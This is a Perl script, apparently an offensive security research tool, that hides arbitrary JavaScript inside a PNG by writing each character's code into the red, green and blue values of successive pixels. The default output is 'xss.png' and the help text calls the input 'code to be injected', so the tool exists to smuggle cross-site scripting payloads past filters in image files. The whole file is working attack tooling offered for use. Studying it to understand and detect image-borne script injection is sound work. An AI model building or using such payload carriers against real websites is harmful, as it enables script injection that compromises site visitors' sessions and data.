#!/usr/bin/perl

use GD;
use Getopt::Long;

# GLOBAL VARIABLES
my $JAVASCRIPT;
my $FILE;
my $IMAGE = "xss.png";
my $VERBOSE = 0;
my $HELP = 0;
my $TRUECOLOR = 0;

if (!&getParams()
    || $HELP
    || !&getJSCode()
    ) {
  &displayHelp();
  exit;
}

&displaySplash();
&makeImage();

sub getParams() {
  
  GetOptions (
              "javascript|j=s"  => \$JAVASCRIPT,
              "file|f=s"        => \$FILE,
              "image|i=s"       => \$IMAGE,
              "truecolor|t"     => \$TRUECOLOR,
              "verbose|v"       => \$VERBOSE,
              "help|h"          => \$HELP,
            );

  if (!($JAVASCRIPT=~/\w/) && !$FILE) { return 0; }
  else { return 1; }
  
}

sub displayHelp() {
  
  print "\n";
  print "make-image.pl <-j javascript_code|-f javascript_file> [-v] [-i image_file] [-h]\n";
  print "\n";
  print "-j  <code>  code to be injected\n";
  print "-f  <file>  file containing JS code\n";
  print "-v          verbose mode: know what you are doing...\n";
  print "-i  <file>  output image file\n";
  print "            default: xss.png\n";
  print "-t  <0|1>   use true type (compressed code).\n";
  print "            if not set code is in \"cleartext\" palette definition\n";
  print "            default: 0\n";
  print "\n";
   
}

sub displaySplash() {
  
  print "\n";
  print "------[       MAKE IMAGE v1.0       ]------\n";
  print "\n";
  print "               Renaud Bidou                \n";
  print "       renaud\@iv2-technologies.com        \n";
  print "\n";
  print "\n";
  
}

sub getJSCode() {
  
  my $result = 1;
  
  if (!($JAVASCRIPT =~/\w/)) {
    if(!open(JSFILE,$FILE)) {
      $result = 0;
    } else {
      foreach my $line(<JSFILE>) {
        $JAVASCRIPT .= $line;
      }
    }
  } 
  
  return $result;
  
}

sub makeImage() {


  my @JSchars = split(//,$JAVASCRIPT);

  my $nb_pixels = $#JSchars+1;

  if($VERBOSE) { print "[+] Number of pixels in the image: $nb_pixels\n"; }

  my $size = 0;

  for(my $i = 1; $size == 0; $i++) {      
    if ($nb_pixels <= ($i*$i)*3) {
        $size = $i;
    }
  }

  print "[+] Image ".$IMAGE." will be $size x $size\n";
  print "\n";

  my $image = new GD::Image($size,$size,$TRUECOLOR);

  my @pixels;
  my $pixel_index = 0;
  my $pixel_nb = 0;

  for(my $line = 0; $line < $size; $line++) {
    for(my $column = 0; $column < $size; $column++) {
            
        my $red = oct("0x00");
        my $green = oct("0x00");
        my $blue = oct("0x00");
        #my $alpha = oct("0x00");
                    
        if(defined($JSchars[$pixel_index])) { $red = ord($JSchars[$pixel_index]); $pixel_index++; }
        if(defined($JSchars[$pixel_index])) { $green = ord($JSchars[$pixel_index]); $pixel_index++; }
        if(defined($JSchars[$pixel_index])) { $blue = ord($JSchars[$pixel_index]); $pixel_index++; }

        if($VERBOSE) {          
          print "[+] Pixel ".$pixel_nb++.": ";                                
          print "$red (".sprintf("0x%.2x",$red).") / ";
          print "$green (".sprintf("0x%.2x",$green).") / ";
          print "$blue (".sprintf("0x%.2x",$blue).")";
          #print "$alpha (".sprintf("0x%.2x",$alpha).")";
          print "\n";
        }
                    
        my $color = $image->colorAllocate($red,$green,$blue);        
        $image->setPixel($column,$line,$color);
    }
  }

  open(IMAGE, ">".$IMAGE);
  binmode(IMAGE);
  print IMAGE $image->png();
  close IMAGE;
  
  print "\n";
  print "[+] $IMAGE created. Up to you now!\n";
  print "\n";

}
